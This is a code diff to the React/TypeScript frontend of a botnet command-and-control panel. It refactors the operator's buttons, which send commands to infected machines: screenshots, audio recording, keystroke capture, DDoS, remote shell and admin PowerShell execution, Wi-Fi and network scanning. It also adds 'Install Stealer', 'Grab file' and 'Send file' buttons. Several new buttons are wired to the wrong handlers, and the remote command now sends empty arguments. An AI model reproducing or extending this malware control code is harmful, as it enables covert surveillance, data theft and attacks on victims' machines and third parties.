@@ -31,7 +31,7 @@ const pullingInterval = 3000;
 export default function BotDetailPage() {
 
     const params = useParams();
-    const currentBot =  params.id;
+    const currentBot =  params.id as string;
 
     const [channel, setChannel] = useState<Channel | null>(null)
     const [loading, setLoading] = useState<boolean>(false)
@@ -102,58 +102,25 @@ export default function BotDetailPage() {
     }
 
     async function handleScreen()  {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "Screenshot",
-            "args" : {}
-        }
-
-        const res = await fetch(backendUrl + "/commands", {
-            method: "POST",
-            body: JSON.stringify(payload),
-            headers: {
-                "Content-Type" : "application/json"
-            }
-        })
+        const res = await sendCommand(currentBot, "Screenshot", {})
         commandSent()
         await getChannel()
     }
 
     async function handleAudio()  {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "AudioCapture",
-            "args" : {
-                length: 10,
-                path: "C:\\Users\\john\\test.wav"
-            }
-        }
 
-        const res = await fetch(backendUrl + "/commands", {
-            method: "POST",
-            body: JSON.stringify(payload),
-            headers: {
-                "Content-Type" : "application/json"
-            }
+        const res = await sendCommand(currentBot, "AudioCapture", {
+            length: 10,
+            path: "C:\\Users\\john\\test.wav"
         })
         commandSent()
         await getChannel()
     }
 
     async function handleSystemInfo() {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "GetSysInfo",
-            "args" : {}
-        }
 
-        const res = await fetch(backendUrl + "/commands", {
-            method: "POST",
-            body: JSON.stringify(payload),
-            headers: {
-                "Content-Type" : "application/json"
-            }
-        })
+        const res = await sendCommand(currentBot, "GetSysInfo", {})
+
         commandSent()
     }
 
@@ -162,210 +129,86 @@ export default function BotDetailPage() {
     }
 
     async function handlePublicIp(){
-        const payload = {
-            "botId" : currentBot,
-            "name" : "GetPublicIp",
-            "args" : {}
-        }
 
-        const res = await fetch(backendUrl + "/commands", {
-            method: "POST",
-            body: JSON.stringify(payload),
-            headers: {
-                "Content-Type" : "application/json"
-            }
-        })
+        const res =  await sendCommand(currentBot, "GetPublicIp", {})
         commandSent()
 
     }
 
     async function handlePrivateIp() {
 
-        const payload = {
-            "botId" : currentBot,
-            "name" : "GetPrivateIp",
-            "args" : {}
-        }
-
-        const res = await fetch(backendUrl + "/commands", {
-            method: "POST",
-            body: JSON.stringify(payload),
-            headers: {
-                "Content-Type" : "application/json"
-            }
-        })
-
+        const res =  await sendCommand(currentBot, "GetPrivateIp", {})
         commandSent()
-
     }
 
     async function handleInstallPython() {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "InstallPython",
-            "args" : {}
-        }
-
-        const res = await fetch(backendUrl + "/commands", {
-            method: "POST",
-            body: JSON.stringify(payload),
-            headers: {
-                "Content-Type" : "application/json"
-            }
-        })
-
+        const res =  await sendCommand(currentBot, "InstallPython", {})
         commandSent()
     }
 
     async function handleInstallIpScanner() {
-
+        const res =  await sendCommand(currentBot, "InstallIpScanner", {})
+        commandSent()
     }
 
     async function handlePullingRate() {
 
-
-        const payload = {
-            "botId" : currentBot,
-            "name" : "SetPullingRate",
-            "args" : {
-                command: "whoami"
-            }
-        }
+        const res =  await sendCommand(currentBot, "SetPullingRate", {
+            command: "whoami"
+        })
 
         commandSent()
     }
 
     async function handleGateway() {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "Gateway",
-            "args" : {
-                command: "whoami"
-            }
-        }
+        const res =  await sendCommand(currentBot, "Gateway", {
+            command: "whoami"
+        })
 
         commandSent()
     }
 
     async function handleWifi() {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "WifiList",
-            "args" : {
-                command: "whoami"
-            }
-        }
+
+        const res =  await sendCommand(currentBot, "WifiList", {})
 
         commandSent()
     }
 
     async function handleDdos() {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "Ddos",
-            "args" : {
-                command: "whoami"
-            }
-        }
+
+        const res =  await sendCommand(currentBot, "Ddos", {})
         commandSent()
 
     }
 
     async function handleNetworkScan() {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "NetworkScan",
-            "args" : {
-                command: "whoami"
-            }
-        }
-
+        const res =  await sendCommand(currentBot, "NetworkScan", {})
         commandSent()
     }
 
     async function handleCmd() {
-
-        const payload = {
-            "botId" : currentBot,
-            "name" : "RunCommand",
-            "args" : {
-                command: command
-            }
-        }
-
-        const res = await fetch(backendUrl + "/commands", {
-            method : "POST",
-            body: JSON.stringify(payload),
-            headers: {
-                "Content-Type" : "application/json"
-            }
-        })
-
+        const res =  await sendCommand(currentBot, "RunCommand", {})
         setCommand("")
         commandSent()
     }
 
     async function handleAdminPowershell() {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "PowershellAdmin",
-            "args" : {
-                command: command
-            }
-        }
 
-        const res = await fetch(backendUrl + "/commands", {
-            method: "POST",
-            body: JSON.stringify(payload),
-            headers: {
-                "Content-Type" : "application/json"
-            }
+        const res =  await sendCommand(currentBot, "PowershellAdmin", {
+            command: command
         })
 
         setCommand("")
-
         commandSent()
     }
 
-    async function handleOpenTunnel() {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "OpenTunnel",
-            "args" : {}
-        }
-
-        commandSent()
-    }
 
     async function handleKeyboardData() {
-        const payload = {
-            "botId" : currentBot,
-            "name" : "GetKeyboardData",
-            "args" : {}
-        }
-
+        const res =  await sendCommand(currentBot, "GetKeyboardData", {})
         commandSent()
     }
 
-    async function handleInstallTunnel() {
-
-        const payload = {
-            "botId" : currentBot,
-            "name" : "InstallTunnel",
-            "args" : {}
-        }
-
-        const res = await fetch(backendUrl + "/commands", {
-            method: "POST",
-            body: JSON.stringify(payload),
-            headers: {
-                "Content-Type" : "application/json"
-            }
-        })
-        commandSent()
-        await getChannel()
-
-    }
 
     function renderMessage(message: any) {
         if (message.from === "c2") {
@@ -439,16 +282,17 @@ export default function BotDetailPage() {
                         <Button colorScheme='green' onClick={handleDdos}>Ddos</Button>
                         <Button colorScheme='green' onClick={handleNetworkScan}>Network Scan</Button>
                         <Button colorScheme='green' onClick={handleKeyboardData}>Keyboard Data</Button>
+                        <Button colorScheme='green' onClick={handleKeyboardData}>Grab file</Button>
+                        <Button colorScheme='green' onClick={handleKeyboardData}>Send file</Button>
 
                     </div>
                     <div className={"flex gap-2 basis-full"}>
                         <Button colorScheme='yellow' onClick={handleFile}>Get File</Button>
                         <Button colorScheme='yellow' onClick={handlePing}>Ping</Button>
-                        <Button colorScheme='yellow' onClick={handleGateway}>Gateway</Button>
+                        <Button colorScheme='yellow' onClick={handleGateway}>Set Relay</Button>
                         <Button colorScheme='yellow' onClick={handlePullingRate}>Pulling Rate</Button>
-                        <Button colorScheme='yellow' onClick={handleOpenTunnel}>Open Tunnel</Button>
-                        <Button colorScheme='yellow' onClick={handleInstallTunnel}>Install Tunnel</Button>
                         <Button colorScheme='yellow' onClick={handleInstallIpScanner}>Install Ip Scanner</Button>
+                        <Button colorScheme='yellow' onClick={handleInstallIpScanner}>Install Stealer</Button>
                         <Button colorScheme='yellow' onClick={handleInstallPython}>Install Python</Button>
                     </div>
 
